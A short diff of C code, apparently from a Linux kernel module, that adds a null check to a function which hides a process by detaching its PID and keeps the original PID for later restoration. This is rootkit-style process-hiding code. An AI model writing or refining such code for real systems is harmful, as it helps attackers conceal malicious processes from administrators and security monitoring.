@@ -89,12 +89,17 @@ static int hideProcess(int pidNumber) {
 
 
 static struct restorableHiddenTask hideProcessGivenRcuLockIsHeldAndReturnRestorableHiddenTask(struct pid *pid) {
-	struct task_struct *task = pid_task(pid, PIDTYPE_PID); 	//TODO: ensure task is not null perhaps..
-	struct pid *originalPid = detachPidAndGetOldPid(task, PIDTYPE_PID);
+	struct task_struct *task = pid_task(pid, PIDTYPE_PID);
+	struct pid *originalPid;
 
+	if (task != NULL) {
+		originalPid = detachPidAndGetOldPid(task, PIDTYPE_PID);
+	} else {
+		originalPid = NULL;
+	}
 	struct restorableHiddenTask result = {
-		.task = task,
-		.originalPid = originalPid,
+			.task = task,
+			.originalPid = originalPid,
 	};
 
 	return result;
